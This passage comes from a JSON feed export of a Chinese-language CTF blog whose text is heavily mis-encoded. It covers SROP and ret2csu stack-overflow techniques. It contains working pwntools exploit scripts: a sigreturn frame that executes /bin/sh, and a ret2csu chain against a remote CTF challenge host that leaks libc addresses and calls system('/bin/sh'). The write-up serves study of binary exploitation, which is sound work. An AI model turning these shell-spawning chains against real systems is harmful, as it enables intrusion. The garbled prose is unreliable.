number\">0x4004DA</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>sigframe <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_execve</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> binsh </pre></td></tr><tr><td data-num=\"53\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall</pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>pl2 <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\x00'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sigreturn<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sigframe<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'‰º†Ëæìsigframe‰πãÂâç======>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'‰º†Ëæìsigframe‰πãÂêé======>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>ÈúÄË¶ÅËÆæÁΩÆÊû∂ÊûÑ</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>execve:</pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\tsigframe = SigreturnFrame()</pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\tsigframe.rax = constants.SYS_execve</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\tsigframe.rdi = binsh </pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\tsigframe.rsi = 0x0</pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\tsigframe.rip = syscall</pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>read:</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\tframe =  SigreturnFrame()</pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\tframe.rax = constants.SYS_read</pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\tframe.rdi = 0</pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\tframe.rsi = stack_addr</pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\tframe.rdx = 0x400</pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\tframe.rsp = stack_addr</pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\tframe.rip = syscall_addr</pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>x64 more information:</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\thttp://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>sigframe <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_execve</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> binsh </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>pl2 <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\x00'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sigreturn<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sigframÔºâ</pre></td></tr></table></figure><p>ÂΩì‰º†ÂÖ• pl2 Êàë‰ª¨Ë∞ÉËØïÂèëÁé∞ÂØÑÂ≠òÂô®ÁöÑÂèòÂåñ</p>\n<p>ÂèØËßÅ srop ÁöÑÊîªÂáªÂéüÁêÜ</p>\n<p><img data-src=\"/img/srop/image-20230803224211151.png\" alt=\"\"></p>\n<p><img data-src=\"/img/srop/image-20230803224917202.png\" alt=\"image-20230803224917202\"></p>\n<p><img data-src=\"/img/srop/image-20230803224304825.png\" alt=\"image-20230803224304825\"></p>\n",
            "tags": [
                "rop",
                "srop"
            ]
        },
        {
            "id": "http://example.com/2023/08/03/csu/",
            "url": "http://example.com/2023/08/03/csu/",
            "title": "csu",
            "date_published": "2023-08-03T11:47:18.000Z",
            "content_html": "<h1 id=\"‰∏≠Á∫ßrop_csu\"><a class=\"markdownIt-Anchor\" href=\"#‰∏≠Á∫ßrop_csu\">#</a> ‰∏≠Á∫ß ROP_CSU</h1>\n<p><strong>ret2csu</strong> Ê≥ÑÈú≤ libc Âú∞ÂùÄ‰πãÂêéÂà©Áî® libc ‰∏≠ÁöÑ gadget getshell. <strong>ret2csu</strong> ÈÖçÂêà pop rax; syscall; Á≠â gadget Áõ¥Êé• GetShell. ÂºÄÂêØ PIE ÁöÑÊÉÖÂÜµ‰∏ãÔºåÂà©Áî® offset2lib ËøõË°å<strong> ret2csu</strong>, ÊàñËÄÖÁõ¥Êé•Âà©Áî® libc ‰∏≠ÁöÑ gadget getshell.</p>\n<p>Âè™Ë¶ÅÂä®ÊÄÅËøûÊé•ÈÉΩ‰ºöÊúâ _libc_csu_init ÂáΩÊï∞</p>\n<h3 id=\"ÂéüÁêÜ\"><a class=\"markdownIt-Anchor\" href=\"#ÂéüÁêÜ\">#</a> ÂéüÁêÜ <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9tZWRpdW0tcm9wLyNfMQ==\">¬∂</span></h3>\n<p>Âú® 64 ‰ΩçÁ®ãÂ∫è‰∏≠ÔºåÂáΩÊï∞ÁöÑÂâç 6 ‰∏™ÂèÇÊï∞ÊòØÈÄöËøáÂØÑÂ≠òÂô®‰º†ÈÄíÁöÑÔºå‰ΩÜÊòØÂ§ßÂ§öÊï∞Êó∂ÂÄôÔºåÊàë‰ª¨ÂæàÈöæÊâæÂà∞ÊØè‰∏Ä‰∏™ÂØÑÂ≠òÂô®ÂØπÂ∫îÁöÑ gadgets„ÄÇ ËøôÊó∂ÂÄôÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî® x64 ‰∏ãÁöÑ __libc_csu_init ‰∏≠ÁöÑ gadgets„ÄÇËøô‰∏™ÂáΩÊï∞ÊòØÁî®Êù•ÂØπ libc ËøõË°åÂàùÂßãÂåñÊìç‰ΩúÁöÑÔºåËÄå‰∏ÄËà¨ÁöÑÁ®ãÂ∫èÈÉΩ‰ºöË∞ÉÁî® libc ÂáΩÊï∞ÔºåÊâÄ‰ª•Ëøô‰∏™ÂáΩÊï∞‰∏ÄÂÆö‰ºöÂ≠òÂú®„ÄÇÊàë‰ª¨ÂÖàÊù•Áúã‰∏Ä‰∏ãËøô‰∏™ÂáΩÊï∞ (ÂΩìÁÑ∂Ôºå‰∏çÂêåÁâàÊú¨ÁöÑËøô‰∏™ÂáΩÊï∞Êúâ‰∏ÄÂÆöÁöÑÂå∫Âà´)</p>\n<p>gadget1_ÂÖàÊâßË°å</p>\n<ul>\n<li>‰ªé 0x000000000040061A ‰∏ÄÁõ¥Âà∞ÁªìÂ∞æÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®Ê†àÊ∫¢Âá∫ÊûÑÈÄ†Ê†à‰∏äÊï∞ÊçÆÊù•ÊéßÂà∂ rbx,rbp,r12,r13,r14,r15 ÂØÑÂ≠òÂô®ÁöÑÊï∞ÊçÆ„ÄÇ</li>\n</ul>\n<pre><code class=\"language-Python\">.text:000000000040061A                 pop     rbx\n.text:000000000040061B                 pop     rbp\n.text:000000000040061C                 pop     r12\n.text:000000000040061E                 pop     r13\n.text:0000000000400620                 pop     r14\n.text:0000000000400622                 pop     r15\n.text:0000000000400624                 retn\n.text:0000000000400624 __libc_csu_init endp\n</code></pre>\n<p>Êàë‰ª¨ÈÄöÂ∏∏‰ºöÊää rbx ÁöÑÂÄºËÆæÁΩÆÊàê 0ÔºåËÄå rbp ËÆæÁΩÆÊàê 1. ËøôÊ†∑ÁöÑÁõÆÁöÑÊòØÂú®ÊâßË°å call qword ptr [r12+rbx*8] Ëøô‰∏™Êåá‰ª§ÁöÑÊó∂ÂÄôÔºåÊàë‰ª¨‰ªÖ‰ªÖÊää r12 ÁöÑÂÄºÁªôËÆæÁΩÆÊàêÊåáÂêëÊàë‰ª¨ÊÉ≥ call Âú∞ÂùÄÁöÑÂú∞ÂùÄÂç≥ÂèØÔºå‰ªéËÄå‰∏çÁî®ÁÆ° rbx„ÄÇ</p>\n<p>ÂèàÂõ†‰∏∫Ëøô‰∏â‰∏™Êåá‰ª§ add rbx,Ôºõcmp rbx, rbpÔºõjnz short loc_400600Ôºåjnz ÊòØ‰∏çÁõ∏Á≠âÊó∂Ë∑≥ËΩ¨ÔºåÊàë‰ª¨ÈÄöÂ∏∏Âπ∂‰∏çÊÉ≥Ë∑≥ËΩ¨Âà∞ 0x400580 Ëøô‰∏™Âú∞ÊñπÔºåÂõ†‰∏∫Ê≠§ÂàªÊâßË°åËøô‰∏â‰∏™Êåá‰ª§ÁöÑÊó∂ÂÄôÔºåÊàë‰ª¨Â∞±ÊòØ‰ªé 0x400600 Ëøô‰∏™Âú∞ÂùÄËøáÊù•ÁöÑ„ÄÇÂõ†Ê≠§ rbx Âä†‰∏Ä‰πãÂêéÔºåÊàë‰ª¨Ë¶ÅËÆ©ÂÆÉÂíå rbp Áõ∏Á≠âÔºåÂõ†Ê≠§ rbp Â∞±Ë¶ÅÊèêÂâçË¢´ËÆæÁΩÆÊàê 1.</p>\n<p>ÁÑ∂Âêé<strong> r12 Ë¶ÅÂ≠òÊîæÁöÑÂ∞±ÊòØÊåáÂêëÔºàÊàë‰ª¨Ë¶ÅË∑≥ËΩ¨Âà∞ÈÇ£‰∏™Âú∞ÂùÄÔºâÁöÑÂú∞ÂùÄ</strong>„ÄÇËøôÈáåÊúâ‰∏™ÂæàÈáçË¶ÅÁöÑÂ∞èÊäÄÂ∑ßÔºåÂ¶ÇÊûú‰Ω†‰∏çÊÉ≥‰ΩøÁî®Ëøô‰∏™ callÔºåÊàñËÄÖËØ¥‰Ω†ÊÉ≥ call ‰∏Ä‰∏™ÂáΩÊï∞Ôºå‰ΩÜÊòØ‰Ω†Êãø‰∏çÂà∞ÂÆÉÁöÑ got Âú∞ÂùÄÔºåÂõ†Ê≠§Ê≤°Ê≥ï‰ΩøÁî®Ëøô‰∏™ callÔºåÈÇ£Â∞±Âéª call ‰∏Ä‰∏™Á©∫ÂáΩÊï∞Ôºà_term_proc ÂáΩÊï∞ÔºâÔºàÂπ∂‰∏îË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºår12 ÁöÑÂú∞ÂùÄÂ°´ÂÜôÁöÑÂπ∂‰∏çÊòØ_term_proc ÁöÑÂú∞ÂùÄÔºåËÄåÊòØÊåáÂêëËøô‰∏™ÂáΩÊï∞ÁöÑÂú∞ÂùÄÔºâ„ÄÇ</p>\n<p>ÁÑ∂Âêé r13,r14,r15 Ëøô‰∏â‰∏™ÂÄºÂàÜÂà´ÂØπÂ∫î‰∫Ü rdx,rsi,edi„ÄÇËøôÈáåË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºår15 ÊúÄÂêé‰º†ÁªôÁöÑÊòØ edi, ÊúÄÂêé rdi ÁöÑÈ´òÂõõÂ≠óËäÇÈÉΩÊòØ 00ÔºåËÄå‰ΩéÂõõÂ≠óËäÇÊâçÊòØ r15 ÈáåÁöÑÂÜÖÂÆπ„ÄÇÔºà‰πüÂ∞±ÊòØËØ¥Â¶ÇÊûúÊÉ≥Áî® ret2csu ÂéªÊää rdi ÈáåÂ≠òÊîæÊàê‰∏Ä‰∏™Âú∞ÂùÄÊòØ‰∏çÂèØË°åÁöÑÔºâ</p>\n<p>gadget2_ÂêéÊâßË°å</p>\n<ul>\n<li>‰ªé 0x0000000000400600 Âà∞ 0x0000000000400609ÔºåÊàë‰ª¨ÂèØ‰ª•Â∞Ü r13 ËµãÁªô rdx, Â∞Ü r14 ËµãÁªô rsiÔºåÂ∞Ü r15d ËµãÁªô ediÔºàÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåËôΩÁÑ∂ËøôÈáåËµãÁªôÁöÑÊòØ ediÔºå<strong>‰ΩÜÂÖ∂ÂÆûÊ≠§Êó∂ rdi ÁöÑÈ´ò 32 ‰ΩçÂØÑÂ≠òÂô®ÂÄº‰∏∫ 0ÔºàËá™Ë°åË∞ÉËØïÔºâ</strong>ÔºåÊâÄ‰ª•ÂÖ∂ÂÆûÊàë‰ª¨ÂèØ‰ª•ÊéßÂà∂ rdi ÂØÑÂ≠òÂô®ÁöÑÂÄºÔºåÂè™‰∏çËøáÂè™ËÉΩÊéßÂà∂‰Ωé 32 ‰ΩçÔºâÔºåËÄåËøô‰∏â‰∏™ÂØÑÂ≠òÂô®Ôºå‰πüÊòØ x64 ÂáΩÊï∞Ë∞ÉÁî®‰∏≠‰º†ÈÄíÁöÑÂâç‰∏â‰∏™ÂØÑÂ≠òÂô®„ÄÇÊ≠§Â§ñÔºåÂ¶ÇÊûúÊàë‰ª¨ÂèØ‰ª•ÂêàÁêÜÂú∞ÊéßÂà∂ r12 ‰∏é rbxÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ÂèØ‰ª•Ë∞ÉÁî®Êàë‰ª¨ÊÉ≥Ë¶ÅË∞ÉÁî®ÁöÑÂáΩÊï∞„ÄÇÊØîÂ¶ÇËØ¥Êàë‰ª¨ÂèØ‰ª•ÊéßÂà∂ rbx ‰∏∫ 0Ôºår12 ‰∏∫Â≠òÂÇ®Êàë‰ª¨ÊÉ≥Ë¶ÅË∞ÉÁî®ÁöÑÂáΩÊï∞ÁöÑÂú∞ÂùÄ„ÄÇ</li>\n</ul>\n<p>Ê≠§Êó∂ÂºÄÂßãÊâßË°åËøôÈÉ®ÂàÜ‰ª£Á†ÅÔºåËøôÊ≤°‰ªÄ‰πàÂ•ΩËØ¥ÁöÑ‰∫ÜÔºåÂ∞±ÊòØÊää r13,r14,r15 ÁöÑÂÄºÊîæÂÖ• rdx,rsi,edi ‰∏â‰∏™ÂØÑÂ≠òÂô®ÈáåÈù¢„ÄÇ</p>\n<p>ÁÑ∂ÂêéÁî±‰∫éÊàë‰ª¨ÂâçÈù¢ÁöÑ rbx ÊòØ 0ÔºåÂä†‰∏Ä‰πãÂêéÁ≠â‰∫é‰∫Ü rbpÔºåÂõ†Ê≠§ jnz ‰∏çË∑≥ËΩ¨„ÄÇÈÇ£Â∞±ÁªßÁª≠Âêë‰∏ãÊâßË°åÔºåÂ¶ÇÊûúÊàë‰ª¨‰∏äÈù¢ call ‰∫Ü‰∏Ä‰∏™Á©∫ÂáΩÊï∞ÁöÑËØùÔºåÈÇ£Êàë‰ª¨Â∞±Âà©Áî®‰∏ãÈù¢ÁöÑ ret„ÄÇÁî±‰∫éÁªßÁª≠Âêë‰∏ãÊâßË°åÔºåÂõ†Ê≠§ÂèàÊù•Âà∞‰∫Ü gadget1 ËøôÈáå„ÄÇ</p>\n<p>Â¶ÇÊûú‰∏çÈúÄË¶ÅÂÜç‰∏ÄÊ¨°ÊéßÂà∂ÂèÇÊï∞ÁöÑËØùÔºåÈÇ£Êàë‰ª¨Ê≠§Êó∂ÊääÊ†à‰∏≠ÁöÑÊï∞ÊçÆÂ°´ÂÖÖ 56Ôºà7*8 ‰Ω†ÊáÇÂæóÔºâ‰∏™ÂûÉÂúæÊï∞ÊçÆÂç≥ÂèØ„ÄÇ</p>\n<p>Â¶ÇÊûúÊàë‰ª¨ËøòÈúÄË¶ÅÁªßÁª≠ÊéßÂà∂ÂèÇÊï∞ÁöÑËØùÔºåÈÇ£Â∞±Ê≠§Êó∂‰∏çÂ°´ÂÖÖÂûÉÂúæÊï∞ÊçÆÔºåÁªßÁª≠ÂéªÊéßÂà∂ÂèÇÊï∞ÔºåÊÄª‰πã‰∏çÁÆ°Âπ≤Âï•Âë¢ÔºåËøôÈáåÈÉΩË¶ÅÂáëÈΩê 56 Â≠óËäÇÁöÑÊï∞ÊçÆÔºå‰ª•‰æøÊàë‰ª¨ÊâßË°åÊúÄÂêéÁöÑ retÔºåÊúÄÂêé ret ÂéªÊâßË°åÊàë‰ª¨ÊÉ≥Ë¶ÅÊâßË°åÁöÑÂáΩÊï∞Âç≥ÂèØ„ÄÇ</p>\n<pre><code class=\"language-Python\">.text:0000000000400600                 mov     rdx, r13\n.text:0000000000400603                 mov     rsi, r14\n.text:0000000000400606                 mov     edi, r15d\n.text:0000000000400609                 call    qword ptr [r12+rbx*8]\n</code></pre>\n<ul>\n<li>‰ªé 0x000000000040060D Âà∞ 0x0000000000400614ÔºåÊàë‰ª¨ÂèØ‰ª•ÊéßÂà∂ rbx ‰∏é rbp ÁöÑ‰πãÈó¥ÁöÑÂÖ≥Á≥ª‰∏∫ rbx+1 = rbpÔºåËøôÊ†∑Êàë‰ª¨Â∞±‰∏ç‰ºöÊâßË°å loc_400600ÔºåËøõËÄåÂèØ‰ª•ÁªßÁª≠ÊâßË°å‰∏ãÈù¢ÁöÑÊ±áÁºñÁ®ãÂ∫è„ÄÇËøôÈáåÊàë‰ª¨ÂèØ‰ª•ÁÆÄÂçïÁöÑËÆæÁΩÆ rbx=0Ôºårbp=1„ÄÇ</li>\n</ul>\n<pre><code class=\"language-Python\">.text:000000000040060D                 add     rbx, 1\n.text:0000000000400611                 cmp     rbx, rbp\n.text:0000000000400614                 jnz     short loc_400600\n</code></pre>\n<p>ÂÅö‰∏Ä‰∏™Á®çÂæÆÁÆÄÂçï‰∏ÄÁÇπÁöÑ ret2libc È¢òÁõÆÔºö</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3RmZXIudmlwL3Byb2JsZW0vMjk2Mw==\">È¢òÁõÆÈìæÊé•Ôºöret2csu</span></p>\n<p><img data-src=\"/img/csu/1280X1280.PNG\" alt=\"img\"></p>\n<p><img data-src=\"/img/csu/1.PNG\" alt=\"img\"></p>\n<p>ÂèØ‰ª•ÁúãÂá∫ÔºåÂíåÂà´ÁöÑÈ¢òÊ≤°‰ªÄ‰πàÁâπÂà´‰πãÂ§Ñ„ÄÇ</p>\n<p><img data-src=\"/img/csu/2.PNG\" alt=\"img\"></p>\n<p><img data-src=\"/img/csu/3.PNG\" alt=\"img\"></p>\n<p>ÂæàÊòéÊòæËÉΩÂ§üÁúãÂá∫Âú® vuln Â§ÑÁöÑ read ÂáΩÊï∞ÊúâÊ†àÊ∫¢Âá∫ÊºèÊ¥û„ÄÇpad ‰∏∫ 0x100+8 Êâæ‰∏Ä‰∏ãÊúâÊ≤°ÊúâÂêéÈó®ÔºàÈ¢òÁõÆÁªôÂá∫ libc Êñá‰ª∂ÔºåÈÇ£‰πà‰∏ÄËà¨ÈÉΩÊòØÊ≤°ÊúâÂêéÈó®ÁöÑÔºâ</p>\n<p><img data-src=\"/img/csu/9fb1273e-c627-4f55-9543-5703e4616f76.png\" alt=\"img\"></p>\n<p>Ê≤°Êúâ system Ë∞ÉÁî®ÔºåÈÇ£‰πàÊàë‰ª¨ÈúÄË¶ÅÂéªÂçïÁã¨Ê≥ÑÈú≤ÂáΩÊï∞ÁöÑÁúüÂÆûÂú∞ÂùÄÔºåÂéªËÆ°ÁÆó system Âú∞ÂùÄ„ÄÇÊàë‰ª¨ÂèØ‰ª•Áî® ROPgadget ÂéªÁúã‰∏Ä‰∏ãÊàë‰ª¨ËÉΩ‰∏çËÉΩÁî®Âü∫Êú¨ÁöÑ ROP ÈìæÂéªÊ≥ÑÈú≤Âú∞ÂùÄÔºåËøôÈáåÊàë‰ª¨ÂèØ‰ª•Ê≥ÑÈú≤ write ÂáΩÊï∞ÁöÑÁúüÂÆûÂú∞ÂùÄÊàñ read ÂáΩÊï∞ÁöÑÁúüÂÆûÂú∞ÂùÄ„ÄÇ</p>\n<pre><code class=\"language-Python\">0x00000000004012ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n</code></pre>\n<p>Êú¨Ë∫´ÊÉ≥Áî®Ëøô‰∏™ gadget ÂéªËé∑ÂèñÁúüÂÆûÂú∞ÂùÄ‰ΩÜÊòØ</p>\n<pre><code class=\"language-Python\">payload = pad + p64(pop_chain) + p64(1) + p64(write_got) + p64(8) + p64(0) + p64(write_plt) + p64(main_addr)\n</code></pre>\n<p>‰∏äÈù¢ÊûÑÈÄ†ÁöÑ payload Âπ∂‰∏çËÉΩÂæóÂà∞Âú∞ÂùÄ</p>\n<p>ÊâÄ‰ª•ËÄÅËÄÅÂÆûÂÆûÁöÑÂéªÁî® csu ÂéªÂÅöËøô‰∏™È¢òÂêß„ÄÇ</p>\n<p><img data-src=\"/img/csu/9812e1fa-bbb4-409c-b30b-04675e83af54.png\" alt=\"img\"></p>\n<p>gadget_1 = 0x4012AA</p>\n<p>gadget_2 = 0x401290</p>\n<p>‰ΩÜÊòØËøôÈáåÊúâË∂£ÁöÑÊòØË∑≥ËΩ¨ÁöÑÂú∞ÂùÄÊòØÁî® r15+rbx*8 ÊâÄ‰ª•Âè™ÈúÄË¶ÅÊ≥®ÊÑèÁöÑ‰∏ÄÁÇπ r15 ÈôÑÂà∞Êàë‰ª¨ÊÉ≥Ë∑≥ËΩ¨Âà∞Âú∞ÂùÄÂ∞±Ë°å„ÄÇ</p>\n<pre><code class=\"language-Python\">payload = pad \npayload += p64(gadget_1)\npayload += p64(0) # rbx\npayload += p64(1) # rbp\npayload += p64(1) # r12\npayload += p64(write_got) # r13\npayload += p64(8) # r14\npayload += p64(write_got) # r15\npayload += p64(gadget_2)\npayload += b'a'*(0x8+8*6)\npayload += p64(main_addr)\nfrom pwn import *\ncontext.log_level = 'debug'\ndebug = 0\nif debug :\n        p = process('ret2csu')\nelse:\n        p = remote('node1.anna.nssctf.cn',28119)\n\nelf = ELF('ret2csu')\n\ngadget_1 = 0x4012AA\ngadget_2 = 0x401290\nwrite_got = elf.got['write']\nwrite_plt = elf.plt['write']\nprint(hex(write_got))\nmain_addr = elf.symbols['main']\nprint(hex(main_addr))\npop_rdi = 0x04012b3\n# pop_chain = 0x00000000004012ac\nret = 0x040101a \npad = b'a'*(0x100 + 0x8)\npayload = pad \npayload += p64(gadget_1)\npayload += p64(0) # rbx\npayload += p64(1) # rbp\npayload += p64(1) # r12\npayload += p64(write_got) # r13\npayload += p64(8) # r14\npayload += p64(write_got) # r15\npayload += p64(gadget_2)\npayload += b'a'*(0x8+8*6)\npayload += p64(main_addr)\n\np.recvuntil('Input:\\n')\np.sendline(payload)\nwrite_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\n\nlibc = ELF('libc.so.6')\nbase = write_addr - libc.sym['write']\nsys = base + libc.sym['system']\nbin_sh = list(libc.search(b'/bin/sh'))[0] + base\npayload1 = pad + p64(ret) +p64(pop_rdi) + p64(bin_sh) + p64(sys)\np.recvuntil('Input:\\n')\np.sendline(payload1)\n\np.interactive()\n</code></pre>\n<h3 id=\"ÊèíÂ∫è-gdb-‰∏Ä‰∫õÁî®Ê≥ï\"><a class=\"markdownIt-Anchor\" href=\"#ÊèíÂ∫è-gdb-‰∏Ä‰∫õÁî®Ê≥ï\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JyZWV6ZV9DQVQvYXJ0aWNsZS9kZXRhaWxzLzEwMzc4OTIzMw==\">ÊèíÂ∫è gdb ‰∏Ä‰∫õÁî®Ê≥ï</span></h3>\n<h4 id=\"xÂëΩ‰ª§\"><a class=\"markdownIt-Anchor\" href=\"#xÂëΩ‰ª§\">#</a> X ÂëΩ‰ª§Ôºö</h4>\n<p>ÂèØ‰ª•‰ΩøÁî® examine ÂëΩ‰ª§ (ÁÆÄÂÜôÊòØ x) Êù•Êü•ÁúãÂÜÖÂ≠òÂú∞ÂùÄ‰∏≠ÁöÑÂÄº„ÄÇx ÂëΩ‰ª§ÁöÑËØ≠Ê≥ïÂ¶Ç‰∏ãÊâÄÁ§∫Ôºö</p>\n<p>x/&lt;n/f/u&gt;</p>\n<p><strong>n„ÄÅf„ÄÅu ÊòØÂèØÈÄâÁöÑÂèÇÊï∞„ÄÇ</strong></p>\n<p>n ÊòØ‰∏Ä‰∏™Ê≠£Êï¥Êï∞ÔºåË°®Á§∫ÈúÄË¶ÅÊòæÁ§∫ÁöÑÂÜÖÂ≠òÂçïÂÖÉÁöÑ‰∏™Êï∞Ôºå‰πüÂ∞±ÊòØËØ¥‰ªéÂΩìÂâçÂú∞ÂùÄÂêëÂêéÊòæÁ§∫Âá†‰∏™ÂÜÖÂ≠òÂçïÂÖÉÁöÑÂÜÖÂÆπÔºå‰∏Ä‰∏™ÂÜÖÂ≠òÂçïÂÖÉÁöÑÂ§ßÂ∞èÁî±ÂêéÈù¢ÁöÑ u ÂÆö‰πâ„ÄÇ</p>\n<p>f Ë°®Á§∫ÊòæÁ§∫ÁöÑÊ†ºÂºèÔºåÂèÇËßÅ‰∏ãÈù¢„ÄÇÂ¶ÇÊûúÂú∞ÂùÄÊâÄÊåáÁöÑÊòØÂ≠óÁ¨¶‰∏≤ÔºåÈÇ£‰πàÊ†ºÂºèÂèØ‰ª•ÊòØ sÔºåÂ¶ÇÊûúÂú∞ÂçÅÊòØÊåá‰ª§Âú∞ÂùÄÔºåÈÇ£‰πàÊ†ºÂºèÂèØ‰ª•ÊòØ i„ÄÇ</p>\n<pre><code>x ÊåâÂçÅÂÖ≠ËøõÂà∂Ê†ºÂºèÊòæÁ§∫ÂèòÈáè„ÄÇ\nd ÊåâÂçÅËøõÂà∂Ê†ºÂºèÊòæÁ§∫ÂèòÈáè„ÄÇ\nu ÊåâÂçÅÂÖ≠ËøõÂà∂Ê†ºÂºèÊòæÁ§∫Êó†Á¨¶Âè∑Êï¥Âûã„ÄÇ\no ÊåâÂÖ´ËøõÂà∂Ê†ºÂºèÊòæÁ§∫ÂèòÈáè„ÄÇ\nt Êåâ‰∫åËøõÂà∂Ê†ºÂºèÊòæÁ§∫ÂèòÈáè„ÄÇ\na ÊåâÂçÅÂÖ≠ËøõÂà∂Ê†ºÂºèÊòæÁ§∫ÂèòÈáè„ÄÇ\nc ÊåâÂ≠óÁ¨¶Ê†ºÂºèÊòæÁ§∫ÂèòÈáè„ÄÇ\nf ÊåâÊµÆÁÇπÊï∞Ê†ºÂºèÊòæÁ§∫ÂèòÈáè„ÄÇ\ns ÊåâÂ≠óÁ¨¶‰∏≤ÊòæÁ§∫„ÄÇ\nb ÊåâÂ≠óÁ¨¶ÊòæÁ§∫„ÄÇ\ni ÊòæÁ§∫Ê±áÁºñÊåá‰ª§„ÄÇ\n</code></pre>\n<p>u Ë°®Á§∫‰ªéÂΩìÂâçÂú∞ÂùÄÂæÄÂêéËØ∑Ê±ÇÁöÑÂ≠óËäÇÊï∞ÔºåÂ¶ÇÊûú‰∏çÊåáÂÆöÁöÑËØùÔºåGDB 